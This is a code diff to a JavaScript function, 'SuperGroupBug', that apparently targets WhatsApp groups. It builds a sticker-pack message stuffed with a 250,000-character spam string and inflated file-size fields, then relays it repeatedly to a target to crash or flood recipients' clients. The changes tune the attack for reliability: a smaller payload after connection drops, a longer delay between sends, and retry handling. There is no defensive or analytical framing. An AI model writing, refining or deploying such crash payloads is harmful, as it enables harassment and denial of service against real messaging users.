@@ -15,9 +15,10 @@ function createSticker(fileName) {
 
 async function SuperGroupBug(SYxS7, target) {
     try {
-        // Generating a massive 1,000,000 character payload
-        const superSpam = getSuperPayload(1000000); 
-        const stickers = Array(30).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"));
+        // Optimized payload size to 250,000 characters for stability
+        // 1M was causing 'Reason: 500' connection drops
+        const superSpam = getSuperPayload(250000); 
+        const stickers = Array(20).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"));
         
         const payload = {
             stickerPackMessage: {
@@ -26,11 +27,11 @@ async function SuperGroupBug(SYxS7, target) {
                 publisher: "KING ROBIN",
                 packDescription: superSpam,
                 stickers: stickers,
-                fileLength: "999999999999",
-                stickerPackSize: "999999999999",
+                fileLength: "999999999",
+                stickerPackSize: "999999999",
                 contextInfo: {
                     externalAdReply: {
-                        title: "💀 1M ULTRA GROUP DESTROYER 💀",
+                        title: "💀 ULTRA GROUP DESTROYER 💀",
                         body: superSpam,
                         showAdAttribution: true,
                         renderLargerThumbnail: true,
@@ -49,15 +50,19 @@ async function SuperGroupBug(SYxS7, target) {
             }
         };
 
-        // Aggressively send the 1M super message
-        for (let i = 0; i < 10; i++) {
-            await SYxS7.relayMessage(target, payload, {
-                participant: { jid: target }
-            });
-            await delay(200); // Ultra fast repetition
+        // Repeatedly send the optimized super message
+        for (let i = 0; i < 12; i++) {
+            try {
+                await SYxS7.relayMessage(target, payload, {
+                    participant: { jid: target }
+                });
+                await delay(400); // Slightly increased delay for stability
+            } catch (e) {
+                console.log("Relay attempt failed, skipping...");
+            }
         }
     } catch (error) {
-        console.error("SuperGroupBug 1M failed:", error.message);
+        console.error("SuperGroupBug optimized failed:", error.message);
     }
 }
 
